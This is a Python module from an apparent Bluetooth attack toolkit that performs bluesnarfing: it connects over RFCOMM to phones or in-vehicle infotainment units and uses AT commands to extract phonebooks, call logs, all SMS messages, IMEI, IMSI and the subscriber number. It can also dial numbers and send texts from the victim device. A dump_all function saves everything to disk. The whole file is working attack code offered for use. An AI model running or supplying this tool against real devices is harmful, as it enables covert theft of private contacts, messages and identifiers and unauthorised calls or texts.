"""Bluesnarfer wrapper - AT command-based data extraction over RFCOMM.

Bluesnarfer uses AT commands (AT+CPBR, AT+CMGL, etc.) to read phonebook,
call logs, and SMS directly from the target device. Many IVIs support these
AT commands without prompting for permission.

This module provides both a bluesnarfer binary wrapper and a pure-Python
AT command client over RFCOMM for cases where bluesnarfer isn't available.

Memory types (AT+CPBS):
  SM  = SIM phonebook
  ME  = Phone memory
  DC  = Dialed calls
  RC  = Received calls
  MC  = Missed calls
  FD  = Fixed dialing
  ON  = Own numbers
"""

import socket
import time

from bt_tap.utils.bt_helpers import run_cmd, check_tool
from bt_tap.utils.output import info, success, error, warning


class ATClient:
    """Pure-Python AT command client over RFCOMM.

    This is an alternative to bluesnarfer that works without external tools.
    Connects to an RFCOMM channel (typically SPP or DUN) and sends AT commands.

    Usage:
        client = ATClient("AA:BB:CC:DD:EE:FF", channel=1)
        client.connect()
        contacts = client.read_phonebook("ME", 1, 500)
        calls = client.read_phonebook("DC", 1, 100)
        sms = client.read_sms("ALL")
        imei = client.get_imei()
        client.disconnect()
    """

    def __init__(self, address: str, channel: int = 1):
        self.address = address
        self.channel = channel
        self.sock = None

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
            )
            self.sock.settimeout(5.0)
            info(f"Connecting AT client to {self.address} ch {self.channel}...")
            self.sock.connect((self.address, self.channel))
            success("AT RFCOMM connected")
            # Drain any initial banner
            try:
                self.sock.recv(1024)
            except socket.timeout:
                pass
            return True
        except OSError as e:
            error(f"AT connect failed: {e}")
            return False

    def disconnect(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_at(self, command: str, timeout: float = 3.0) -> str:
        """Send AT command and return response."""
        if not self.sock:
            return ""
        try:
            self.sock.send(f"{command}\r\n".encode())
            response = b""
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    data = self.sock.recv(4096)
                    if data:
                        response += data
                        text = response.decode("utf-8", errors="replace")
                        if "OK" in text or "ERROR" in text:
                            break
                except socket.timeout:
                    continue
            return response.decode("utf-8", errors="replace")
        except OSError as e:
            error(f"AT error: {e}")
            return ""

    def read_phonebook(self, memory: str = "ME",
                        start: int = 1, end: int = 500) -> list[dict]:
        """Read phonebook entries using AT+CPBR.

        Memory types: SM (SIM), ME (phone), DC (dialed), RC (received), MC (missed)
        """
        # Select memory
        self.send_at(f'AT+CPBS="{memory}"')

        # Read entries
        response = self.send_at(f"AT+CPBR={start},{end}", timeout=10.0)
        entries = []
        for line in response.splitlines():
            line = line.strip()
            if line.startswith("+CPBR:"):
                # +CPBR: <index>,<number>,<type>,<name>
                parts = line[6:].split(",", 3)
                if len(parts) >= 4:
                    entries.append({
                        "index": parts[0].strip(),
                        "number": parts[1].strip().strip('"'),
                        "type": parts[2].strip(),
                        "name": parts[3].strip().strip('"'),
                    })
        return entries

    def read_sms(self, status: str = "ALL") -> list[dict]:
        """Read SMS messages using AT+CMGL.

        Status: "REC UNREAD", "REC READ", "STO UNSENT", "STO SENT", "ALL"
        """
        # Set text mode
        self.send_at("AT+CMGF=1")

        response = self.send_at(f'AT+CMGL="{status}"', timeout=15.0)
        messages = []
        lines = response.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i].strip()
            if line.startswith("+CMGL:"):
                # +CMGL: <index>,<stat>,<sender>,<alpha>,<date>
                header_parts = line[6:].split(",", 4)
                msg = {
                    "index": header_parts[0].strip() if len(header_parts) > 0 else "",
                    "status": header_parts[1].strip().strip('"') if len(header_parts) > 1 else "",
                    "sender": header_parts[2].strip().strip('"') if len(header_parts) > 2 else "",
                    "timestamp": header_parts[4].strip().strip('"') if len(header_parts) > 4 else "",
                    "body": "",
                }
                # Next line(s) are the message body
                i += 1
                body_lines = []
                while i < len(lines) and not lines[i].strip().startswith("+CMGL:") and lines[i].strip() != "OK":
                    body_lines.append(lines[i])
                    i += 1
                msg["body"] = "\n".join(body_lines).strip()
                messages.append(msg)
                continue
            i += 1
        return messages

    def get_imei(self) -> str:
        """Get device IMEI."""
        response = self.send_at("AT+CGSN")
        for line in response.splitlines():
            line = line.strip()
            if line.isdigit() and len(line) == 15:
                return line
        return ""

    def get_imsi(self) -> str:
        """Get SIM IMSI."""
        response = self.send_at("AT+CIMI")
        for line in response.splitlines():
            line = line.strip()
            if line.isdigit() and len(line) >= 14:
                return line
        return ""

    def get_subscriber_number(self) -> str:
        """Get own phone number."""
        response = self.send_at("AT+CNUM")
        return response

    def get_battery(self) -> str:
        """Get battery level."""
        return self.send_at("AT+CBC")

    def get_signal(self) -> str:
        """Get signal strength."""
        return self.send_at("AT+CSQ")

    def get_operator(self) -> str:
        """Get network operator."""
        return self.send_at("AT+COPS?")

    def dial(self, number: str) -> str:
        """Initiate a call (if supported)."""
        return self.send_at(f"ATD{number};")

    def send_sms(self, number: str, message: str) -> str:
        """Send an SMS (if supported)."""
        self.send_at("AT+CMGF=1")  # Text mode
        self.sock.send(f'AT+CMGS="{number}"\r'.encode())
        time.sleep(0.5)
        self.sock.send(f"{message}\x1a".encode())  # Ctrl+Z to send
        time.sleep(2)
        try:
            return self.sock.recv(1024).decode("utf-8", errors="replace")
        except socket.timeout:
            return ""

    def dump_all(self, output_dir: str = "at_dump") -> dict:
        """Dump all available data via AT commands."""
        import os
        os.makedirs(output_dir, exist_ok=True)
        results = {}

        # Device info
        info("Gathering device info...")
        device_info = {
            "imei": self.get_imei(),
            "imsi": self.get_imsi(),
            "subscriber": self.get_subscriber_number(),
            "operator": self.get_operator(),
            "signal": self.get_signal(),
            "battery": self.get_battery(),
        }
        results["device_info"] = device_info
        _write_json(os.path.join(output_dir, "device_info.json"), device_info)
        success(f"IMEI: {device_info['imei']}")

        # Phonebooks
        for mem, desc in [("ME", "Phone"), ("SM", "SIM"), ("DC", "Dialed"),
                          ("RC", "Received"), ("MC", "Missed")]:
            info(f"Reading {desc} phonebook ({mem})...")
            entries = self.read_phonebook(mem)
            if entries:
                results[f"phonebook_{mem}"] = entries
                _write_json(os.path.join(output_dir, f"phonebook_{mem}.json"), entries)
                success(f"  {desc}: {len(entries)} entries")

        # SMS
        info("Reading SMS messages...")
        messages = self.read_sms("ALL")
        if messages:
            results["sms"] = messages
            _write_json(os.path.join(output_dir, "sms.json"), messages)
            success(f"  SMS: {len(messages)} messages")

        return results


def bluesnarfer_extract(address: str, memory: str = "ME",
                         start: int = 1, end: int = 100) -> str:
    """Use bluesnarfer binary for phonebook extraction.

    Fallback when pure-Python AT client doesn't work.
    """
    if not check_tool("bluesnarfer"):
        error("bluesnarfer not found. Install: apt install bluesnarfer")
        return ""

    info(f"Running bluesnarfer on {address} (memory={memory}, range={start}-{end})")
    result = run_cmd(
        ["bluesnarfer", "-b", address, "-s", memory, "-r", f"{start}-{end}"],
        timeout=30,
    )
    if result.returncode == 0:
        success(f"bluesnarfer output:\n{result.stdout}")
        return result.stdout
    else:
        error(f"bluesnarfer failed: {result.stderr}")
        return ""


def _write_json(path: str, data):
    import json
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
